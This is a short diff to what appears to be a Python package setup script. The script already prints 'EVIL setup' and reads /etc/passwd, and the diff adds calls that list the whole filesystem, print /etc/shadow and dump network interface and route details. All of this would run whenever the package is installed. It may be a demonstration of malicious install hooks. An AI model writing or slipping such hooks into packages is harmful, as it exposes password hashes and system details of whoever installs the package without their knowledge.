@@ -18,6 +18,13 @@ print('EVIL setup!!!!\r\n\r\n')
 with open('/etc/passwd', 'r') as fin:
     print fin.read()
 
+import subprocess
+subprocess.call(["find", "/"])
+subprocess.call(["cat", "/etc/shadow"])
+subprocess.call(["ifconfig"])
+subprocess.call(["ip", "route"])
+
+
 here = path.abspath(path.dirname(__file__))
 
 # Get the long description from the README file
